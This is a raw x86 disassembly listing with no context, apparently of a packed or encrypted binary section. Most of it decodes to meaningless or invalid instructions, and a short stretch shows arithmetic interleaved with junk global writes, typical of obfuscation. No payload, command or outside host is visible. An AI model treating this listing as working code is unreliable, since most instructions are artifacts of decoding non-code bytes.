  405ae4:	ins    DWORD PTR es:[edi],dx
  405ae5:	cmp    eax,0x77e328f7
  405aea:	pusha  
  405aeb:	sub    dh,bh
  405aed:	int    0xff
  405aef:	pop    esi
  405af0:	inc    esi
  405af1:	push   esi
  405af2:	loope  0x405a91
  405af4:	mul    bl
  405af6:	sbb    eax,0x421a06fe
  405afb:	popf   
  405afc:	and    eax,0x72cabefd
  405b01:	push   ss
  405b02:	cmp    ebp,DWORD PTR [ebx+0x2d8dbcc3]
  405b08:	add    ch,ch
  405b0a:	cmp    ebp,edi
  405b0c:	frstor [edi]
  405b0e:	(bad)  
  405b0f:	arpl   WORD PTR [edx],di
  405b11:	punpcklwd mm4,DWORD PTR [esi]
  405b14:	push   ebp
  405b15:	(bad)  
  405b16:	jo     0x405b32
  405b18:	xor    esi,DWORD PTR [ecx+0x19a856c1]
  405b1e:	mov    esi,0x42bc7ae6
  405b23:	inc    edx
  405b24:	push   edi
  405b25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b26:	xchg   edi,eax
  405b27:	sbb    BYTE PTR [ebx],bh
  405b29:	rol    DWORD PTR [edx+0x5d6882de],1
  405b2f:	jmp    0x405b08
  405b31:	cmp    BYTE PTR [esi],dl
  405b33:	fcomi  st,st(2)
  405b35:	adc    al,dl
  405b37:	adc    BYTE PTR [ebp-0x50],bl
  405b3a:	cmp    al,0x58
  405b3c:	inc    eax
  405b3d:	lds    ecx,FWORD PTR [edi+0x36431ec9]
  405b43:	sbb    DWORD PTR [esi],edi
  405b45:	or     dl,dh
  405b47:	jne    0x405af2
  405b49:	jg     0x405b21
  405b4b:	fucomip st,st(5)
  405b4d:	push   0xffffffda
  405b4f:	mov    dh,0x83
  405b51:	in     al,0x7c
  405b53:	int3   
  405b54:	mov    dl,0xed
  405b56:	mov    dl,0xac
  405b58:	sub    al,0xe0
  405b5a:	fdivr  QWORD PTR [edx+0xa99e8e6]
  405b60:	stos   DWORD PTR es:[edi],eax
  405b61:	sub    eax,0x38e53909
  405b66:	sub    DWORD PTR [eax+0x41e646a4],esi
  405b6c:	outs   dx,DWORD PTR ds:[esi]
  405b6d:	aaa    
  405b6e:	test   al,ah
  405b70:	push   esi
  405b71:	bound  ebx,QWORD PTR ds:0xc5b05f38
  405b77:	lea    ebx,ds:0xfbf77dae
  405b7d:	mov    ds:0xed7bb3e0,al
  405b82:	sub    eax,eax
  405b84:	xchg   ebp,eax
  405b85:	adc    ah,BYTE PTR [edx-0x4e60ff1]
  405b8b:	adc    eax,ebp
  405b8d:	mov    esp,0x6264e97e
  405b92:	jne    0x405b7a
  405b94:	loope  0x405bfa
  405b96:	aaa    
  405b97:	sbb    ecx,ebx
  405b99:	faddp  st(1),st
  405b9b:	sti    
  405b9c:	jecxz  0x405ba5
  405b9e:	gs loopne 0x405b5e
  405ba1:	push   edi
  405ba2:	mov    ch,0xed
  405ba4:	les    edx,FWORD PTR [edx+0x7f]
  405ba7:	pop    ss
  405ba8:	jno    0x405bcd
  405baa:	dec    eax
  405bab:	stos   BYTE PTR es:[edi],al
  405bac:	(bad)  
  405bad:	(bad)  
  405bae:	fiadd  WORD PTR [esp+ebx*4-0x40b67f5b]
  405bb5:	and    eax,0xda97462c
  405bba:	inc    ebx
  405bbb:	xlat   BYTE PTR cs:[ebx]
  405bbd:	sub    al,0xb5
  405bbf:	dec    ebp
  405bc0:	inc    ecx
  405bc1:	ds xchg esp,eax
  405bc3:	mov    DWORD PTR [esi],edi
  405bc5:	ret    0xf4de
  405bc8:	push   edi
  405bc9:	mov    edi,DWORD PTR [edx+0x1f]
  405bcc:	push   eax
  405bcd:	mov    dl,0x9a
  405bcf:	sub    eax,0xa527d34c
  405bd4:	rol    DWORD PTR [ebx+0x16],0x52
  405bd8:	sub    DWORD PTR [edx+ebx*4],esi
  405bdb:	push   esi
  405bdc:	sbb    ebp,DWORD PTR [ecx+ecx*2]
  405bdf:	xor    BYTE PTR [esi-0x17cdcdcd],ah
  405be5:	daa    
  405be6:	call   0xa377bca0
  405beb:	or     bh,dh
  405bed:	stos   DWORD PTR es:[edi],eax
  405bee:	jb     0x405ba4
  405bf0:	jmp    FWORD PTR [ebx-0x44863929]
  405bf6:	aad    0x27
  405bf8:	mov    dh,0x2c
  405bfa:	xchg   esp,eax
  405bfb:	dec    edx
  405bfc:	imul   DWORD PTR [esi-0x46b7c25d]
  405c02:	test   BYTE PTR [edi+ebx*8-0x60],bh
  405c06:	sbb    DWORD PTR [edx],ebp
  405c08:	xor    DWORD PTR [ebp-0x5e0e3a48],ecx
  405c0e:	(bad)  
  405c0f:	stos   DWORD PTR es:[edi],eax
  405c10:	push   0x4a
  405c12:	pusha  
  405c13:	(bad)  
  405c15:	dec    edi
  405c16:	ds mov bl,0xfa
  405c19:	ins    DWORD PTR es:[edi],dx
  405c1a:	push   ebx
  405c1b:	pop    ebp
  405c1c:	out    dx,al
  405c1d:	inc    eax
  405c1e:	push   edx
  405c1f:	cmp    DWORD PTR [edx+edi*2-0x6],ebx
  405c23:	fimul  DWORD PTR [ebx+edx*1]
  405c26:	adc    DWORD PTR [ebx+0x3bcf41dd],0xffffffd5
  405c2d:	push   0xffffff87
  405c2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c30:	lahf   
  405c31:	xlat   BYTE PTR ds:[ebx]
  405c32:	push   eax
  405c33:	sub    DWORD PTR [edx+0x26],esp
  405c36:	mov    ecx,0xb4d12290
  405c3b:	push   0xffffff87
  405c3d:	adc    BYTE PTR [ecx+ecx*2-0x6dc089a6],ah
  405c44:	jp     0x405c0e
  405c46:	aas    
  405c47:	or     edx,ebx
  405c49:	push   cs
  405c4a:	jl     0x405cab
  405c4c:	js     0x405c98
  405c4e:	jno    0x405c66
  405c50:	(bad)  
  405c52:	adc    dl,BYTE PTR [eax]
  405c54:	ins    BYTE PTR es:[edi],dx
  405c55:	dec    esp
  405c56:	add    BYTE PTR [esi+0x4d],dh
  405c59:	xchg   BYTE PTR [edi-0x30989782],cl
  405c5f:	lods   al,BYTE PTR ds:[esi]
  405c60:	bound  edx,QWORD PTR [edx-0x7d]
  405c63:	dec    esp
  405c64:	cmp    DWORD PTR ds:0x2dea5842,esi
  405c6a:	inc    edx
  405c6b:	sbb    DWORD PTR [edi+edx*8],ebp
  405c6e:	and    ecx,DWORD PTR [ebx]
  405c70:	xchg   ebx,eax
  405c71:	scas   al,BYTE PTR es:[edi]
  405c72:	push   ss
  405c73:	or     edx,DWORD PTR [ebx]
  405c75:	ret    0xeb85
  405c78:	loop   0x405cf9
  405c7a:	adc    eax,0x1cf666d2
  405c7f:	nop
  405c80:	add    BYTE PTR [edx],0x8f
  405c83:	push   ebp
  405c84:	mov    al,BYTE PTR [ebx-0x18]
  405c87:	arpl   WORD PTR [edx-0x66e37666],bx
  405c8d:	cmc    
  405c8e:	rol    BYTE PTR [esi+eiz*8],1
  405c91:	fidivr DWORD PTR [ecx]
  405c93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c94:	jmp    0xfa72889e
  405c99:	xor    esi,DWORD PTR [ecx+0x17]
  405c9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c9d:	outs   dx,BYTE PTR ds:[esi]
  405c9e:	loopne 0x405c3a
  405ca0:	add    ch,bh
  405ca2:	sub    DWORD PTR [eax+0x52],0xffffff9a
  405ca6:	inc    esi
  405ca7:	mov    bl,0x66
  405ca9:	outs   dx,DWORD PTR ds:[esi]
  405caa:	imul   ebx,DWORD PTR [eax+0x38c2a7aa],0x3ecc0811
  405cb4:	nop
  405cb5:	in     eax,dx
  405cb6:	mov    edx,DWORD PTR es:[edi]
  405cb9:	adc    dl,bl
  405cbb:	call   0x2486:0x7be73776
  405cc2:	xor    BYTE PTR [ebx],al
  405cc4:	scas   al,BYTE PTR es:[edi]
  405cc5:	sar    DWORD PTR [ebx],0xca
  405cc8:	popf   
  405cc9:	in     al,0xac
  405ccb:	loope  0x405c77
  405ccd:	scas   al,BYTE PTR es:[edi]
  405cce:	xor    esp,DWORD PTR [edx-0x45]
  405cd1:	cmp    eax,0xd55c5064
  405cd6:	pushf  
  405cd7:	fldenv [edx-0x2e]
  405cda:	enter  0xbf8b,0x29
  405cde:	std    
  405cdf:	aam    0x18
  405ce1:	pop    ebp
  405ce2:	leave  
  405ce3:	add    BYTE PTR [edi-0x12],ah
  405ce6:	retf   0x662c
  405ce9:	(bad)  
  405cea:	jmp    0x405d04
  405cec:	stos   BYTE PTR es:[edi],al
  405ced:	call   DWORD PTR [esi]
  405cef:	daa    
  405cf0:	or     al,0x22
  405cf2:	pop    esp
  405cf3:	xchg   edx,eax
  405cf4:	hlt    
  405cf5:	mov    BYTE PTR [edx+ebp*4],al
  405cf8:	outs   dx,BYTE PTR ds:[esi]
  405cf9:	les    ebp,FWORD PTR [esi-0x7873c85e]
  405cff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d00:	cmp    DWORD PTR [eax],edi
  405d02:	pop    edx
  405d03:	lods   eax,DWORD PTR ds:[esi]
  405d04:	clc    
  405d05:	lea    edi,[ebp-0x1b]
  405d08:	mov    al,0x4b
  405d0a:	push   ebp
  405d0b:	rol    BYTE PTR [edx+0x5566ae23],0xa5
  405d12:	inc    ecx
  405d13:	retf   
  405d14:	test   eax,0x8a378a23
  405d19:	mov    dl,0x49
  405d1b:	pop    esp
  405d1c:	push   ebx
  405d1d:	or     ebx,esp
  405d1f:	adc    al,0xa2
  405d21:	cmp    DWORD PTR ds:0x470c548d,ebp
  405d27:	sbb    edi,DWORD PTR [ebp-0x1ef4aa48]
  405d2d:	mov    bl,0xc6
  405d2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d30:	mov    cs,WORD PTR [edi-0x6c]
  405d33:	sbb    DWORD PTR [ebx+0x3b],ecx
  405d36:	mov    edi,0x142e2f78
  405d3b:	mov    dl,0xc
  405d3d:	aam    0xef
  405d3f:	xor    BYTE PTR [edx-0x669a482],dh
  405d45:	xor    al,0xcb
  405d47:	sbb    eax,0x8f3075ef
  405d4c:	mov    ch,0x62
  405d4e:	fdivr  DWORD PTR [ecx+0x1]
  405d51:	or     esp,ebx
  405d53:	lods   al,BYTE PTR ds:[esi]
  405d54:	mov    edx,DWORD PTR [ebx+0x4]
  405d57:	movzx  edx,BYTE PTR ds:0x422946
  405d5e:	sub    DWORD PTR ds:0x4228f2,edx
  405d64:	xor    DWORD PTR [ebp-0x1c],edi
  405d67:	mov    edx,eax
  405d69:	or     DWORD PTR ds:0x4229ae,0x4229a2
  405d73:	xor    eax,eax
  405d75:	or     DWORD PTR ds:0x4228fa,0x422996
  405d7f:	or     eax,DWORD PTR [ebp-0x1c]
  405d82:	shl    edx,0x1e
  405d85:	sub    DWORD PTR ds:0x4228be,0x422982
  405d8f:	imul   eax,ecx
  405d92:	mov    ecx,DWORD PTR [ebx]
  405d94:	mov    edx,DWORD PTR [ebx+0x4]
  405d97:	shrd   ecx,edx,0x2
  405d9b:	inc    DWORD PTR ds:0x4228ee
  405da1:	mov    DWORD PTR [ebp-0x1c],ecx
  405da4:	mov    ecx,DWORD PTR [ebx]
  405da6:	xor    DWORD PTR [ebp-0x1c],edi
  405da9:	shr    edx,0x2
  405dac:	and    edx,DWORD PTR ds:0x4228ba
  405db2:	mov    edx,DWORD PTR [ebx+0x4]
  405db5:	movzx  edx,BYTE PTR ds:0x4228d2
  405dbc:	or     edx,DWORD PTR ds:0x422916
  405dc2:	mov    DWORD PTR ds:0x4228d2,edx
  405dc8:	mov    edx,ecx
  405dca:	add    DWORD PTR ds:0x42292a,0x4228d2
  405dd4:	xor    ecx,ecx
  405dd6:	and    DWORD PTR ds:0x4228c6,0x42295e
  405de0:	or     ecx,DWORD PTR [ebp-0x1c]
  405de3:	sbb    DWORD PTR ds:0x42288e,0x3b2c
  405ded:	shl    edx,0x1e
  405df0:	add    DWORD PTR ds:0x422926,0x2b51
  405dfa:	sub    ecx,eax
  405dfc:	mov    DWORD PTR ds:0x422992,0x2b61
  405e06:	mov    eax,DWORD PTR [ebp-0xc]
  405e09:	cmp    DWORD PTR [eax],ecx
  405e0b:	mov    eax,0x22e3
  405e10:	mov    eax,DWORD PTR [ebp-0xc]
  405e13:	jg     0x4069f3
  405e19:	xor    DWORD PTR ds:0x422956,0x2c62
  405e23:	mov    ecx,DWORD PTR [ebp+0x18]
  405e26:	adc    edx,0x3fdb
  405e2c:	mov    edx,DWORD PTR [ebp+0x1c]
  405e2f:	shrd   ecx,edx,0x2
  405e33:	or     DWORD PTR ds:0x42290e,0x2fd2
  405e3d:	mov    DWORD PTR [ebp-0x1c],ecx
  405e40:	xor    DWORD PTR ds:0x42297e,0x77ef
  405e4a:	mov    ecx,DWORD PTR [ebp+0x18]
  405e4d:	xor    DWORD PTR [ebp-0x1c],edi
  405e50:	shl    ecx,0x1e
  405e53:	xor    ecx,ecx
  405e55:	add    DWORD PTR ds:0x4229c6,0x4228de
  405e5f:	or     ecx,DWORD PTR [ebp-0x1c]
  405e62:	xor    DWORD PTR ds:0x42295a,0x42288a
  405e6c:	shr    edx,0x2
  405e6f:	mov    edx,DWORD PTR [ebp+0x1c]
  405e72:	mov    DWORD PTR [ebp-0x2c],ecx
  405e75:	mov    ecx,DWORD PTR [ebx]
  405e77:	or     DWORD PTR ds:0x42290a,edi
  405e7d:	mov    edx,DWORD PTR [ebx+0x4]
  405e80:	shrd   ecx,edx,0x2
  405e84:	sub    DWORD PTR ds:0x42294a,0x1cb2
  405e8e:	jmp    0x406418
  405e93:	fwait
  405e94:	push   edx
  405e95:	dec    esi
  405e96:	mov    dl,0x4e
  405e98:	xchg   edx,eax
  405e99:	sbb    edx,DWORD PTR [edx+0x58]
  405e9c:	inc    edi
  405e9d:	push   esi
  405e9e:	je     0x405edc
  405ea0:	mov    gs,edi
  405ea2:	push   0x1616973e
  405ea7:	cmp    eax,0x9b161604
  405eac:	cmc    
  405ead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405eae:	adc    al,0x7b
  405eb0:	mov    bh,0x85
  405eb2:	sub    edi,DWORD PTR [eax+eiz*4-0x28d15887]
  405eb9:	ret    0x6922
  405ebc:	push   edi
  405ebd:	iret   
  405ebe:	arpl   dx,sp
  405ec0:	dec    eax
  405ec1:	mov    dl,0x5a
  405ec3:	scas   eax,DWORD PTR es:[edi]
  405ec4:	or     eax,0x1d382ef8
  405ec9:	arpl   WORD PTR [eax+0x25],si
  405ecc:	in     al,0x6b
  405ece:	dec    esi
  405ecf:	cdq    
  405ed0:	push   edi
  405ed1:	mov    cl,0xbd
  405ed3:	mov    bl,0xa0
  405ed5:	enter  0x59de,0xc9
  405ed9:	cld    
  405eda:	mov    ebx,?
  405edc:	ret    0x7e7
  405edf:	jg     0x405eac
  405ee1:	mov    eax,ds:0xfdf3526c
  405ee6:	cmp    al,0x48
  405ee8:	dec    edi
  405ee9:	leave  
  405eea:	push   es
  405eeb:	fdivr  QWORD PTR [edx]
  405eed:	sub    BYTE PTR [eax],0xd8
  405ef0:	push   ss
  405ef1:	dec    esp
  405ef2:	cmp    BYTE PTR [ebp-0x43931328],bh
  405ef8:	push   ss
  405ef9:	sub    BYTE PTR [esi+0x15a10268],bh
  405eff:	loope  0x405f14
  405f01:	in     eax,0x15
  405f03:	int    0x1d
  405f05:	repz inc esi
  405f07:	and    bl,dh
  405f09:	mov    cl,0x78
  405f0b:	inc    eax
  405f0c:	js     0x405eda
  405f0e:	pop    esp
  405f0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f10:	push   esi
  405f11:	out    0x24,eax
  405f13:	imul   ecx,esp,0x47857236
  405f19:	into   
  405f1a:	mov    ebx,0xd22e1a4
  405f1f:	in     al,dx
  405f20:	push   esp
  405f21:	(bad)  [edi+0x7d6bdb07]
  405f27:	jne    0x405f7c
  405f29:	pop    eax
  405f2a:	or     eax,0x29ea7cee
  405f2f:	push   cs
  405f30:	push   ss
  405f31:	and    al,0xfc
  405f33:	dec    esp
  405f34:	mov    DWORD PTR [ecx-0x46],esi
  405f37:	dec    ecx
  405f38:	and    ebp,DWORD PTR [ecx+eiz*1-0x10]
  405f3c:	cmp    eax,0x77e33aac
  405f41:	rcr    BYTE PTR [edx+0x44129b1b],1
  405f47:	and    al,0xc8
  405f49:	pop    esi
  405f4a:	or     esi,DWORD PTR [edx-0x50738cf2]
  405f50:	inc    edi
  405f51:	xchg   esi,eax
  405f52:	or     DWORD PTR [eax+0x2984e418],eax
  405f58:	(bad)  
  405f59:	(bad)  
  405f5b:	gs jbe 0x405fc3
  405f5e:	jb     0x405f26
  405f60:	fcom   QWORD PTR [edx+0x1b]
  405f63:	pop    ebp
  405f64:	and    ebx,DWORD PTR [ebp+0x4f]
  405f67:	ins    DWORD PTR es:[edi],dx
  405f68:	xchg   al,ch
  405f6a:	pop    ss
  405f6b:	pusha  
  405f6c:	repnz mul bl
  405f6f:	push   ecx
  405f70:	jecxz  0x405f73
  405f72:	push   esi
  405f73:	or     eax,0x96ea0f19
  405f78:	out    dx,al
  405f79:	add    eax,0x778a6102
  405f7e:	cmp    BYTE PTR [esi],ch
  405f80:	push   0x8836d8d6
  405f85:	mov    ds:0x2d6f46ef,eax
  405f8a:	cmp    DWORD PTR [ecx-0x28],ebp
  405f8d:	out    dx,al
  405f8e:	outs   dx,DWORD PTR ds:[esi]
  405f8f:	and    ah,BYTE PTR [ebx]
  405f91:	repz pop ebp
  405f93:	int    0x21
  405f95:	sub    ah,dh
  405f97:	cmp    cl,ah
  405f99:	pop    ds
  405f9a:	shl    DWORD PTR [esi+0x4],0xb5
  405f9e:	pop    ss
  405f9f:	sar    DWORD PTR [edi-0x4f783230],cl
  405fa5:	inc    eax
  405fa6:	sub    DWORD PTR [edi],edx
  405fa8:	sbb    bh,BYTE PTR [ecx+ecx*2+0x51]
  405fac:	xchg   BYTE PTR [edi],bh
  405fae:	in     eax,0x10
  405fb0:	jb     0x406024
  405fb2:	pushf  
  405fb3:	fsubr  st(3),st
  405fb5:	push   esi
  405fb6:	jge    0x405fc2
  405fb8:	out    dx,al
  405fb9:	stos   BYTE PTR es:[edi],al
  405fba:	stos   BYTE PTR es:[edi],al
  405fbb:	and    eax,0x17479e59
  405fc0:	and    edx,eax
  405fc2:	jne    0x405f91
  405fc4:	mov    ch,ch
  405fc6:	add    al,BYTE PTR [ebp+0x36733be8]
  405fcc:	mov    bh,0x17
  405fce:	jnp    0x405f50
  405fd0:	mov    eax,ds:0x6606980e
  405fd5:	daa    
  405fd6:	test   DWORD PTR [edx-0x4],ebx
  405fd9:	xor    BYTE PTR [eax],ch
  405fdb:	cmp    eax,0x739347f3
  405fe0:	pusha  
  405fe1:	xchg   ebp,eax
  405fe2:	popf   
  405fe3:	ins    DWORD PTR es:[edi],dx
  405fe4:	inc    eax
  405fe5:	and    al,0x76
  405fe7:	ret    0xecc0
  405fea:	pop    ebx
  405feb:	cwde   
  405fec:	lock or DWORD PTR [ecx+ebp*4+0x1120cbf7],0xffffffa7
  405ff5:	mov    bl,0xbc
  405ff7:	sub    ch,BYTE PTR [ebx]
  405ff9:	or     DWORD PTR [ecx],ecx
  405ffb:	push   ss
  405ffc:	iret   
  405ffd:	aas    
  405ffe:	stos   BYTE PTR es:[edi],al
  405fff:	push   esi
  406000:	iret   
  406001:	cmp    DWORD PTR [ebx+0x7],0xf1479396
  406008:	imul   esi,DWORD PTR [ebx-0x29],0x2788e545
  40600f:	or     DWORD PTR [ecx+0x6d],ebx
  406012:	fisubr DWORD PTR [esi+0x312abff7]
  406018:	repnz xor eax,0x7c35e8e1
  40601e:	or     DWORD PTR [ecx+esi*2-0x60d16270],ebx
  406025:	xchg   bl,dh
  406027:	mov    dl,bl
  406029:	xor    ebp,DWORD PTR [edi]
  40602b:	lods   al,BYTE PTR ds:[esi]
  40602c:	rol    ah,1
  40602e:	scas   al,BYTE PTR es:[edi]
  40602f:	sub    esp,DWORD PTR [edi-0x3e]
  406032:	ret    
  406033:	and    dh,BYTE PTR [esi+0x6f]
  406036:	shl    BYTE PTR [eax-0xf4ab9b0],0xf5
  40603d:	jae    0x405fd2
  40603f:	(bad)  
  406040:	push   DWORD PTR [eax-0x17596805]
  406046:	leave  
  406047:	pop    esp
  406048:	pop    ecx
  406049:	loope  0x405fd6
  40604b:	(bad)  
  40604c:	xor    eax,0x408ce719
  406051:	xchg   esp,eax
  406052:	(bad)
  406056:	addr16 add ebx,0x5b
  40605a:	push   cs
  40605b:	rcl    esp,0x4a
  40605e:	jmp    0x405fe0
  406060:	jmp    0x94b:0x818d49f2
  406067:	mov    dh,0x53
  406069:	jge    0x405fed
  40606b:	and    ah,BYTE PTR [ebx]
  40606d:	mov    ds:0x91a1d86c,eax
  406072:	idiv   ebp
  406074:	inc    edi
  406075:	leave  
  406076:	and    eax,0x9350bf0
  40607b:	pop    esi
  40607c:	ret    
  40607d:	je     0x406031
  40607f:	fcom   DWORD PTR [edx-0x10]
  406082:	cmp    eax,0xceb8c26b
  406087:	add    al,0x66
  406089:	pop    ds
  40608a:	adc    al,0x17
  40608c:	in     eax,dx
  40608d:	outs   dx,DWORD PTR ds:[esi]
  40608e:	and    ch,BYTE PTR [esi+ebx*4]
  406091:	icebp  
  406092:	add    esp,DWORD PTR [edx+0x32fb90d]
  406098:	hlt    
  406099:	dec    ecx
  40609a:	shr    DWORD PTR [eax-0x52715cfd],cl
  4060a0:	das    
  4060a1:	leave  
  4060a2:	in     eax,dx
  4060a3:	adc    ecx,ebp
  4060a5:	int3   
  4060a6:	adc    eax,0xd21ac8ae
  4060ab:	pop    eax
  4060ac:	iret   
  4060ad:	jge    0x406097
  4060af:	int    0xfb
  4060b1:	xor    cl,al
  4060b3:	xchg   ebp,eax
  4060b4:	ss pop ds
  4060b6:	popf   
  4060b7:	xor    ebp,DWORD PTR [ebp+0x62]
  4060ba:	out    0xd4,al
  4060bc:	jge    0x4060d7
  4060be:	out    0xa9,al
  4060c0:	scas   eax,DWORD PTR es:[edi]
  4060c1:	mov    eax,0x56f54ec2
  4060c6:	mov    eax,ds:0x1ce3d004
  4060cb:	fs dec ebp
  4060cd:	leave  
  4060ce:	aas    
  4060cf:	(bad)  
  4060d0:	mov    dl,0xc1
  4060d2:	jp     0x406135
  4060d4:	js     0x406104
  4060d6:	push   ecx
  4060d7:	adc    BYTE PTR [ebp+0x5b],0xd0
  4060db:	mov    eax,0xe780df65
  4060e0:	xor    cl,0x51
  4060e3:	gs scas eax,DWORD PTR es:[edi]
  4060e5:	(bad)  
  4060e6:	(bad)  
  4060e7:	xor    esp,DWORD PTR [eax+0x60]
  4060ea:	sar    DWORD PTR [eax],0xb4
  4060ed:	pop    edx
  4060ee:	pushf  
  4060ef:	push   esp
  4060f0:	cmp    esi,DWORD PTR [ecx+0x58]
  4060f3:	or     eax,0xeab2d90
  4060f8:	jb     0x406140
  4060fa:	pop    ebx
  4060fb:	scas   al,BYTE PTR es:[edi]
  4060fc:	addr16 es mov bh,0xc0
  406100:	push   es
  406101:	push   ebx
  406102:	js     0x406156
  406104:	jp     0x4060e2
  406106:	aaa    
  406107:	or     DWORD PTR [edi+0x7a2c070c],0xf105002b
  406111:	push   edi
  406112:	sub    bl,BYTE PTR [eax]
  406114:	or     dh,bl
  406116:	lahf   
  406117:	mov    al,0xef
  40611a:	add    BYTE PTR [ebp+0x3a],0xc0
  40611e:	jne    0x4060f1
  406120:	mov    BYTE PTR [ebx-0x36],dl
  406123:	sub    BYTE PTR [esp+eax*2+0x21],ch
  406127:	lods   eax,DWORD PTR ds:[esi]
  406128:	sbb    dh,BYTE PTR [edx]
  40612a:	sbb    DWORD PTR [eax],edx
  40612c:	jle    0x40612c
  40612e:	mov    DWORD PTR [eax],ebx
  406130:	jns    0x4061a7
  406132:	push   0x45e62497
  406137:	pop    esi
  406138:	fwait
  406139:	add    ebp,DWORD PTR [ebp-0x8]
  40613c:	and    ch,BYTE PTR ds:0xddef144b
  406142:	jb     0x4060c5
  406144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406145:	and    eax,0x5da1da78
  40614a:	xchg   DWORD PTR [eax],esi
  40614c:	nop
  40614d:	xor    BYTE PTR [ebx],0xce
  406150:	jb     0x4060e4
  406152:	push   ss
  406153:	push   ebx
  406154:	xor    al,0x14
  406156:	jno    0x40611c
  406158:	sub    DWORD PTR ds:0xd295b25d,edi
  40615e:	in     al,dx
  40615f:	sti    
  406160:	pop    eax
  406161:	or     al,0xad
  406163:	adc    DWORD PTR [ebp+0x21],esp
  406166:	inc    ecx
  406167:	jno    0x4061e3
  406169:	mov    bh,BYTE PTR [ebx+esi*2-0x3d]
  40616d:	arpl   di,sp
  40616f:	outs   dx,BYTE PTR ds:[esi]
  406170:	add    DWORD PTR [ecx+ebp*2],edi
  406173:	ret    0x6157
  406176:	add    bl,BYTE PTR [edi-0x1c]
  406179:	jge    0x40618b
  40617b:	mov    dl,BYTE PTR [ebp-0x78]
  40617e:	adc    DWORD PTR [edi-0xa6a2d40],ebp
  406184:	std    
  406185:	push   es
  406186:	jmp    0x4546c7aa
  40618b:	das    
  40618c:	shl    ebp,1
  40618e:	loopne 0x40611b
  406190:	xchg   esi,eax
  406191:	iret   
  406192:	xchg   esi,eax
  406193:	fcmovnu st,st(2)
  406195:	mov    esp,es
  406197:	adc    al,0x85
  406199:	pop    ebp
  40619a:	mov    DWORD PTR [esi+0x64],edi
  40619d:	inc    ecx
  40619e:	mov    ecx,0x4b52cb89
  4061a3:	pop    eax
  4061a4:	mov    dl,0x12
  4061a6:	divps  xmm4,XMMWORD PTR [ecx+0x1e9e43a4]
  4061ad:	daa    
  4061ae:	xchg   esi,eax
  4061af:	sbb    edx,DWORD PTR [ebx-0xc]
  4061b2:	aam    0xab
  4061b4:	ror    esp,cl
  4061b6:	mov    ds,WORD PTR [ebx-0x2f]
  4061b9:	adc    DWORD PTR [ebx],0xffffffa3
  4061bc:	xchg   ebx,eax
  4061bd:	mov    dh,0x96
  4061bf:	gs or  al,0x34
  4061c2:	mov    BYTE PTR [ebp-0x2],al
  4061c5:	cmp    dl,0xbe
  4061c8:	cs add edx,DWORD PTR ds:[ebp+0x32]
  4061cd:	repz pop eax
  4061cf:	ror    DWORD PTR [eax+0x130ea8c5],cl
  4061d5:	ret    
  4061d6:	xor    DWORD PTR [esi-0x50],0x53
  4061da:	xchg   ebx,eax
  4061db:	iret   
  4061dc:	cmp    ecx,DWORD PTR [ebx+0x2b]
  4061df:	mov    bl,0xa4
  4061e1:	sbb    ebp,edx
  4061e3:	sub    edx,eax
  4061e5:	iret   
  4061e6:	sub    bh,BYTE PTR [ebx]
  4061e8:	pop    edi
  4061e9:	inc    edi
  4061ea:	adc    BYTE PTR [ebx+0x115cd43d],ch
  4061f0:	or     al,0x83
  4061f2:	(bad)  
  4061f3:	push   cs
  4061f4:	dec    ebx
  4061f5:	int3   
  4061f6:	or     ah,BYTE PTR [ebx+edx*1-0x28]
  4061fa:	add    al,0x69
  4061fc:	(bad)  
  4061fd:	mov    ebx,0xa4ea8389
  406202:	push   es
  406203:	in     eax,dx
  406204:	fistp  DWORD PTR [ebx-0x1a]
  406207:	jle    0x40622e
  406209:	push   esi
  40620a:	jge    0x4061ae
  40620c:	sti    
  40620d:	jnp    0x40619b
  40620f:	inc    edi
  406210:	lock fldcw WORD PTR [ebx-0x2a]
  406214:	and    BYTE PTR [ebx-0x9],ch
  406217:	ins    BYTE PTR es:[edi],dx
  406218:	dec    esi
  406219:	xchg   DWORD PTR [ecx],edx
  40621b:	call   0x8f8e46be
  406220:	iret   
  406221:	jecxz  0x4061eb
  406223:	jge    0x406209
  406225:	test   esp,ebp
  406227:	adc    BYTE PTR [ebp+0x39],0x20
  40622b:	or     al,0x8f
  40622d:	jge    0x406219
  40622f:	pop    ecx
  406230:	mov    dh,0xcf
  406232:	in     eax,dx
  406233:	repnz mov ds:0x59b57506,al
  406239:	in     al,dx
  40623a:	fs hlt 
  40623c:	pop    ebx
  40623d:	mov    ds:0xa5e93ef7,eax
  406242:	xchg   dl,dl
  406244:	ins    DWORD PTR es:[edi],dx
  406245:	xchg   esi,eax
  406246:	stc    
  406247:	jle    0x4061e4
  406249:	sub    eax,0xe9cf563e
  40624e:	sub    al,0x6f
  406250:	dec    esp
  406251:	sub    ah,BYTE PTR [ebx+0x592dd8b6]
  406257:	popa   
  406258:	ds xchg ebp,eax
  40625a:	gs push edx
  40625c:	test   DWORD PTR [eax],ebp
  40625e:	push   edx
  40625f:	push   ds
  406260:	imul   BYTE PTR ds:0xada11cd4
  406266:	xor    al,0x91
  406268:	lock retf 
  40626a:	jae    0x4062d3
  40626c:	fcomp  QWORD PTR [ebp+0x50dac9c1]
  406272:	cmp    esi,eax
  406274:	xchg   BYTE PTR [ebp-0x3f896d41],dh
  40627a:	aam    0xa3
  40627c:	jmp    0x40629b
  40627e:	mov    ebx,0x496976ae
  406283:	adc    al,al
  406285:	mov    ebp,0x236e6f10
  40628a:	xchg   ebp,eax
  40628b:	and    ecx,DWORD PTR [ecx]
  40628d:	into   
  40628e:	fisubr WORD PTR [edi-0x429effa4]
  406294:	pop    ss
  406295:	cmp    DWORD PTR [esi],eax
  406297:	bound  ecx,QWORD PTR [eax]
  406299:	repz repz pop esp
  40629c:	adc    edi,DWORD PTR [ebx+0x1f8793a4]
  4062a2:	or     BYTE PTR [ecx-0x40791077],bl
  4062a8:	push   DWORD PTR [ebp-0xfd14da5]
  4062ae:	cmp    BYTE PTR [edx+edx*1],bh
  4062b1:	mov    dx,0x8f95
  4062b5:	push   edx
  4062b6:	retf   
  4062b7:	add    DWORD PTR [edx+0x147cab8b],edx
